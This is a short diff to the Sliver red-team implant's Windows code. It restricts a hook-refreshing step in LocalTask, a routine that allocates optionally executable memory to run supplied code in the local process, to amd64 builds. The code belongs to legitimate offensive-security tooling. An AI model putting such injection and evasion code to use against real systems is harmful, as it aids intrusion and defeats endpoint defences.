@@ -31,6 +31,7 @@ import (
 	"strings"
 	"time"
 	"unsafe"
+	"runtime"
 
 	"golang.org/x/sys/windows"
 	"github.com/bishopfox/sliver/sliver/version"
@@ -149,9 +150,12 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 func LocalTask(data []byte, rwxPages bool) error {
-	err := refresh()
-	if err != nil {
-		return err
+	var err error
+	if runtime.GOARCH == "amd64" {
+		err = refresh()
+		if err != nil {
+			return err
+		}
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
